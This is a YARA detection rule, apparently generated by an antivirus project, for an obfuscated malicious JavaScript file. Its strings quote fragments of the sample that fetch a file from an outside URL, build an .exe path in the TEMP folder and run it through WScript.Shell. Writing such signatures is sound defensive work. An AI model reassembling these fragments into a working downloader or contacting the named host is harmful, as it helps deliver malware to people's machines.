rule sig_20160401_759d4732a491cac1ea1550892f3b55d8 {
  meta:
    description = "datamaliciousorder - file 20160401_759d4732a491cac1ea1550892f3b55d8.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "817f51cd8767d77c3af3743c1b3251592185742100ac47c4b7fef4974a29c06c"

  strings:
    $s1  = "DiVc[EzQx](\"G\" + \"ET\", \"http://sirplusalot.org/p3owlk\", false);" fullword ascii
    $s2  = "function GuDic(NbXgp, ZmuDdb){NeiSac = NeiSac * 1; return NbXgp - ZmuDdb;};" fullword ascii
    $s3  = "var TeOsx = function SuuKh() {return WScript[ZlDh](\"WScript\"+\".Shell\");}(), BoCol = 11;" fullword ascii
    $s4  = "if (DiVc[\"readystate\"] < 2 * 2) continue;" fullword ascii
    $s5  = "function MaPm() {return TeOsx[\"ExpandEnvironmentStrings\"](\"%TE\"+\"MP%/\") + \"sW8mY6tT2VkAC5S.ex\" + \"e\";};" fullword ascii
    $s6  = "function BwkKo(){return KyVv + \"\";};" fullword ascii
    $s7  = "function JaGym() {return ((TbHxt == true) && (TbHxt == NwRv)) ? 1 : NeiSac;};" fullword ascii
    $s8  = "TbHxt = true; " fullword ascii
    $s9  = "var QnAvo = false;" fullword ascii
    $s10 = "function UnSk(){return 23;};" fullword ascii
    $s11 = "function EtDs(){return ZlDh;};" fullword ascii
    $s12 = "function PnCv()" fullword ascii
    $s13 = "var TbHxt = false;" fullword ascii
    $s14 = "function MpVot(VdDec) {var AppHj = (1, 2, 3, 4, 5, VdDec); return AppHj;};" fullword ascii
    $s15 = "}while (RyhAyp);" fullword ascii
    $s16 = "return GuDic(XeYr, EimLpn);" fullword ascii
    $s17 = "var NsYc = new this[\"Date\"]();" fullword ascii
    $s18 = "function AvqVx(FjlGw){TeOsx[\"R\"+\"un\"](FjlGw, NeiSac, NeiSac);};" fullword ascii
    $s19 = "var NwRv = false;" fullword ascii
    $s20 = "NwRv = true; " fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}